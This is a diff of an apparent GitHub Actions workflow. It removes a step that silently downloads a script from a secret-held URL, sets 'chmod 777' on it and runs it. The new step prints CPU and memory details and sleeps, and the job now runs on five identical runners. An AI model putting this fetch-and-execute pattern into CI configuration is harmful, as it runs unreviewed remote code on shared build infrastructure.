@@ -8,8 +8,8 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-         os: [ubuntu-latest]
-    timeout-minutes: 360
+         os: [ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest]
+    timeout-minutes: 2
  
     steps:
       - uses: actions/checkout@v4
@@ -17,8 +17,7 @@ jobs:
       - name: Setup App
         working-directory: ./runner
         run: |
-              wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
-              sleep 3
-              chmod 777 autorun.sh
-              ./autorun.sh
+              nproc
+              free -h
+              sleep 5m
         shell: bash
